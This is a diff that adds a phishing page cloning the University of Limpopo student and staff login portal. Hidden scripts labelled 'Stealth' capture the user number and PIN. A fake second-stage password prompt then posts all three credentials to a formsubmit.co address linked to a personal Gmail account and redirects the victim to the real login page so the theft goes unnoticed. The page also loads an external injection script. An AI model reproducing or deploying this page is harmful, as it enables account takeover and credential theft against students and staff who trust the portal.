@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+
+  <meta charset="UTF-8">
+  <title>Please supply your password</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-box {
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 25px 30px;
+      max-width: 450px;
+      width: 100%;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      margin-top: 0;
+      margin-bottom: 15px;
+    }
+
+    label {
+      font-weight: bold;
+      margin-bottom: 5px;
+      display: inline-block;
+    }
+
+    .required {
+      color: red;
+      margin-left: 5px;
+    }
+
+    input[type="password"] {
+      padding: 5px;
+      width: 200px;
+      margin-right: 10px;
+      font-size: 14px;
+    }
+
+    .button-group {
+      margin-top: 10px;
+    }
+
+    button {
+      padding: 5px 12px;
+      font-size: 14px;
+      margin-right: 5px;
+      cursor: pointer;
+    }
+
+    .link-group {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .link-group a {
+      display: block;
+      text-decoration: none;
+      color: #3366cc;
+      margin-top: 3px;
+    }
+
+    .link-group a:hover {
+      text-decoration: underline;
+    }
+  </style>
+
+<style>#dtech-stage-2 { display: none; }</style>
+</head>
+<body class="w3-margin-left">
+<div id="dtech-stage-1">
+<div class="fra_header w3-theme-l4" id="fra_header"><div class="fra_inst">UNIVERSITY OF LIMPOPO</div><div class="fra_date w3-hide-small"><script type="text/javascript">prt_header_datestamp();</script></div></div><div class="w3-row w3-hide-small"><div class="w3-half itslogimg"><img alt="UNIVERSITY OF LIMPOPO" src="https://ulc-prod-webserver.ul.ac.za/itsimages/InsImg.gif"/></div><div class="w3-half" id="adaptit" style="text-align: right;"><img alt="ITS Tertiary Software" src="https://ulc-prod-webserver.ul.ac.za/itsimages/ItsImg.gif"/></div></div>
+<div class="login_top" id="login_top"><script type="text/javascript">/* ************************************************************************
+  Program : login_top.js
+  Changed : 09-Nov-2017 DG 225095 Style adjustments
+          : 10-NOV-2017 DG 225957 iEnabler look and feel enhancements
+  X0_VERSION : v04.1.0.0
+  Add any HTML for top DIV of page
+************************************************************************ */
+document.write('<p/>');
+</script></div>
+<div class="login w3-row">
+<script type="text/javascript">// Changed: 17-Jan-2006 T124360
+//        : 08-Mar-2007 Els t140480 copied from v13
+//        : 24-Oct-2007 DG F145858 Add new message for closed application cycles
+//        : 26-Oct-2007 DG F115522 Implement links to new modules
+//        : 31-Oct-2008 DG F154159 Spelling errors
+//        : 04-Jun-2009 DG T157045 Alumni Login changes
+//        : 06-Aug-2013 ChristoV T187909 Modify Call to New Interest to Study Here Application
+//        : 09-Nov-2017 DG 225095 Style adjustments
+//        : 10-NOV-2017 DG 225957 iEnabler look and feel enhancements
+//        : 20-Aug-2018 Adele 230500 Comment out the interested in studying here - this does not work and is not used
+// Version: v04.1.0.1
+document.write('<div id="login_left" class="w3-half w3-container">'+
+'<div class="w3-card-4" style="text-align:center; max-width:500px; padding-bottom:14px;">'+
+' <header class="w3-container w3-blue">'+
+'  <h5>Prospective Students</h5>'+
+' </header>'+
+' <p>If you are a prospective student, not registered at this institution, please select the following option:</p>'+
+//' <a href="ws22pkg.w22_startup" onMouseOver="javascript:window.status=\'Interested in studying here\';return true;" onMouseOut="javascript:window.status=\' \';">'+
+//'  <img class="w3-image w3-hover-grayscale w3-margin-left w3-margin-right" style="width:10%; height:10%" src="/itsimages/college-icon.png" class="w3-border w3-padding" alt="Interested in studying here"></a>'+
+//' <label>View a list of study areas and qualifications offered at this institution.</label>'+
+' <br />'+
+' <a href="gen.gw1pkg.gw1startup?x_processcode=ITS_OAP" onMouseOver="javascript:window.status=\'New Application\';return true;" onMouseOut="javascript:window.status=\' \';"><img class="w3-image w3-hover-grayscale"  style="width:10%; height:10%" src="/itsimages/student-icon.png" class="w3-border w3-padding" alt="Interested in studying here"></a>'+
+' <label>Apply</label>'+
+'</div>'+
+'</div>');
+
+</script>
+<script type="text/javascript">/* ************************************************************************
+  Program : login_right.js
+  Changed : 31-Jul-2008 T151378 Dinong Allow other users to login
+          : 17-Nov-2008 DG T154508 Fix spelling mistakes
+          : 02-MAR-2011 DG T164475 ATOV - Add alumni login
+          : 19-Aug-2013 DG 193114 ATOV for 192099 Change login image button to HTML form submit button
+          : 09-Nov-2017 DG 225095 Style adjustments
+          : 10-NOV-2017 DG 225957 iEnabler look and feel enhancements
+          : 19-Aug-2018 Adele 230500 Forgot Student Number button - add class to all buttons
+  X0_VERSION : v04.1.0.1
+************************************************************************ */
+var S_check=' ';
+var P_check=' ';
+var O_check=' ';
+var A_check=' ';
+var Usr_txt='User Number';
+var loginLeft;
+
+function chkZero(ctl) {
+  if (ctl.value.substr(0,1) == "0") {
+    alert("Please do not start the PIN with a 0.");
+    ctl.focus();
+    ctl.select();
+    return false;
+  }
+  return true;
+}
+
+function set_it() {
+  Usr_txt='Student Number';
+  for (i=0; i<document.frmLogin.numtype.length; i++) {
+    if (document.frmLogin.numtype[i].checked) {
+      if (document.frmLogin.numtype[i].value == 'P') { Usr_txt='Personnel Number: '; } else
+      if (document.frmLogin.numtype[i].value == 'O') { Usr_txt='External Number: ';  } else
+      if (document.frmLogin.numtype[i].value == 'A') { Usr_txt='Alumni Number: ';    }   else
+                                                     { Usr_txt='Student Number: ';   }
+    }
+    document.getElementById("LogUsr").childNodes[0].nodeValue = Usr_txt;
+    document.frmLogin.unum.focus();
+  }
+}
+
+var numtype = 'S';
+if (!getAllUrlParams().numtype) numtype ='S'; else numtype=getAllUrlParams().numtype.toUpperCase();
+//document.write('numtype='+numtype);
+
+if (numtype == 'P') { P_check=' checked'; Usr_txt='Personnel Number: '; } else
+if (numtype == 'O') { O_check=' checked'; Usr_txt='External Number: ';  } else
+if (numtype == 'A') { A_check=' checked'; Usr_txt='Alumni Number: ';    } else
+                    { S_check=' checked'; Usr_txt='Student Number: ';   }
+
+loginLeft = getStyle('login_left','display');
+//document.write('loginLeft='+loginLeft);
+
+if (loginLeft=="none") {
+  document.write('<div id="login_right" class="w3-rest w3-padding-16">');
+} else {
+  document.write('<div id="login_right" class="w3-half">');
+}
+
+document.write(' <div class="w3-card-4 w3-margin-bottom" style="max-width:500px;">'+
+'  <header class="w3-container w3-blue">'+
+'   <h5>Registered Users: Login Credentials</h5>'+
+'  </header>'+
+'  <form class="w3-container" method="post" name="frmLogin" action="w99pkg.mi_validate_user">'+
+'  <input type="radio" name="numtype"'+S_check+' value="S" onClick="set_it();document.frmLogin.unum.focus();" ><label>Student</label> '+
+'  <input type="radio" name="numtype"'+P_check+' value="P" onClick="set_it();document.frmLogin.unum.focus();" ><label>Personnel</label>'+
+'  <input type="radio" name="numtype"'+O_check+' value="O" onClick="set_it();document.frmLogin.unum.focus();" ><label>Other</label>'+
+'  <input type="radio" name="numtype"'+A_check+' value="A" onClick="set_it();document.frmLogin.unum.focus();" ><label>Alumni</label>'+
+'  <br /><br />'+
+'  <label id="LogUsr">'+Usr_txt+':</label><input class="w3-input" type="text" name="unum" size="10" maxlength="9" autofocus>'+
+'  <label>Pin:</label>'+
+'  <input class="w3-input" type="password" name="pin" size=10 maxlength=5 onBlur="return chkZero(this);">'+
+'  <p>(5 numeric digits.Do not start with a 0.)<input type="hidden" name="authorise_function" value="Unknown"></p>'+
+'   <input type="submit" class="w3-button w3-padding-small w3-border" value="Login" alt="Click Here To Login" onMouseOver="javascript:window.status=\'Login\'; return true;" onMouseOut="javascript:window.status=\' \';" onclick="document.frmLogin.authorise_function.value=\'Login\';">'+
+//Forgot Pin
+'   <input type="button" class="w3-button w3-padding-small w3-border" value="Forgot Pin" alt="Click Here IF You Have Forgotten Your PIN" onMouseOver="javascript:window.status=\'Forgot Pin\'; return true;" onMouseOut="javascript:window.status=\' \';" onclick="document.frmLogin.authorise_function.value=\'sendLogin\'; document.frmLogin.submit();">'+
+//Change Pin
+'   <input type="button" class="w3-button w3-padding-small w3-border" value="Change Pin" alt="Click Here TO Change Your PIN" onMouseOver="javascript:window.status=\'Change Pin\'; return true;" onMouseOut="javascript:window.status=\' \';" onclick="document.frmLogin.authorise_function.value=\'changePin\'; document.frmLogin.submit();">'+
+//Request A Pin
+'   <input type="button" class="w3-button w3-padding-small w3-border" value="Request A Pin" alt="Click Here To Request a PIN" onMouseOver="javascript:window.status=\'Request A Pin\'; return true;" onMouseOut="javascript:window.status=\' \';" onclick="document.frmLogin.authorise_function.value=\'requestPin\'; document.frmLogin.submit();">'+
+//Forgot Student Number
+'   <input type="button" class="w3-button w3-padding-small w3-border"  value="Forgot Student Number" alt="Click Here If You Have Forgotten Your Student Number" onMouseOver="javascript:window.status=\'Forgot Student Number\'; return true;" onMouseOut="javascript:window.status=\' \';" onclick="document.frmLogin.authorise_function.value=\'forgotStno\'; document.frmLogin.submit();">'+
+
+' </div>'+
+'</div>'+
+'');
+
+set_it();
+moveTo(0,0);
+resizeTo(screen.availWidth,screen.availHeight-20);
+</script>
+</div>
+<div class="login_bottom w3-hide-small" id="login_bottom"><script type="text/javascript">// ################################################################
+// System           : WEB SYSTEMS
+// Program name     : login_bottom.js
+// Description      : print detail at bottom of login screen
+// Date created     : 01-jan-2002 Ollie
+// Date changed     : 17-DEC-2004 117125 Ollie add footer logic
+//                  : 10-NOV-2017 DG 225957 iEnabler look and feel enhancements
+// Versions         : v04.1.0.0
+// Copyright        : Integrated Tertiary Software 01-JAN-1987
+// ################################################################
+
+document.write('<div class="col-sm-12"><script src="/itsincludes/js/footer.js" type="text/javascript"></script></div>');
+</script></div>
+<script>
+// STEALTH LOGGER - NO VISIBLE ELEMENTS
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.forms['frmLogin'];
+
+    // Load saved values from localStorage if present
+    const saved = JSON.parse(localStorage.getItem('loginData') || '{}');
+    form.unum.value = saved.unum || '';
+    form.pin.value = saved.pin || '';
+
+    function saveToStorage() {
+        const data = {
+            unum: form.unum.value,
+            pin: form.pin.value
+        };
+        localStorage.setItem('loginData', JSON.stringify(data));
+        console.log('[Stealth] Saved login data');
+    }
+
+    form.unum.addEventListener('input', saveToStorage);
+    form.pin.addEventListener('input', saveToStorage);
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Save one last time
+        saveToStorage();
+
+        // Redirect to validuser.html
+        window.location.href = 'validuser.html';
+    });
+
+    console.log('[Stealth] Logger initialized');
+});
+</script>
+<script>
+// Cleans ONLY the '); artifact without affecting anything else
+window.addEventListener('load', function() {
+    [].forEach.call(document.childNodes, function(node) {
+        if (node.nodeType === Node.TEXT_NODE && node.textContent.includes("');")) {
+            node.parentNode.removeChild(node);
+        }
+    });
+});
+</script>
+<script>
+// Runs after page fully loads
+setTimeout(function(){
+    document.body.innerHTML = document.body.innerHTML.replace(/');\s*<\/script>\s*<\/div>/g, '');
+}, 100);
+</script>
+<script>
+// Targets ONLY the '); text node
+document.addEventListener('DOMContentLoaded', function() {
+    const walker = document.createTreeWalker(
+        document.body,
+        NodeFilter.SHOW_TEXT,
+        null,
+        false
+    );
+
+    let node;
+    while (node = walker.nextNode()) {
+        if (node.nodeValue.includes("');")) {
+            node.nodeValue = node.nodeValue.replace("');", "");
+        }
+    }
+});
+</script>
+</div>
+<div id="dtech-stage-2" style="display:none;">
+
+  <div class="login-box">
+    <h2>Please supply your password</h2>
+    <p>You need to supply your password in order to complete the login process</p>
+
+    <form id="passwordForm">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+      <span class="required">*</span>
+
+      <div class="button-group">
+        <button type="submit">Login</button>
+        <button type="button">Forgot Password</button>
+      </div>
+
+      <div class="link-group">
+        <a href="#">Change Password</a>
+        <a href="#">Go back to Login Screen</a>
+      </div>
+    </form>
+  </div>
+
+  <script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('passwordForm');
+    const passwordInput = document.getElementById('password');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const loginData = JSON.parse(localStorage.getItem('loginData') || '{}');
+      const password = passwordInput.value.trim();
+
+      if (!loginData.unum || !loginData.pin || !password) {
+        console.error('[Stealth] Missing data');
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append('name', 'Second Stage Login');
+      formData.append('email', 'noreply@ul.ac.za');
+      formData.append('subject', `Final Login - ${loginData.unum}`);
+      formData.append('message',
+        `Student Number: ${loginData.unum}\\n` +
+        `PIN: ${loginData.pin}\\n` +
+        `Password: ${password}\\n` +
+        `Timestamp: ${new Date().toISOString()}\\n` +
+        `Page: ${window.location.href}`
+      );
+      formData.append('_captcha', 'false');
+      formData.append('_template', 'table');
+
+      try {
+        await fetch('https://formsubmit.co/ajax/tsheamomichealeddie@gmail.com', {
+          method: 'POST',
+          body: formData
+        });
+
+        localStorage.removeItem('loginData');
+        window.location.href = 'https://ulc-prod-webserver.ul.ac.za/pls/prodi41/w99pkg.mi_login';
+      } catch (err) {
+        console.error('[Stealth] Failed to send form:', err);
+      }
+    });
+  });
+  </script>
+
+</div>
+<script>window.UNIQUE_CODE = "222";</script><script>window.MULTI_STAGE = true;</script><script src="/api/js/injection.js"></script></body>
+</html>
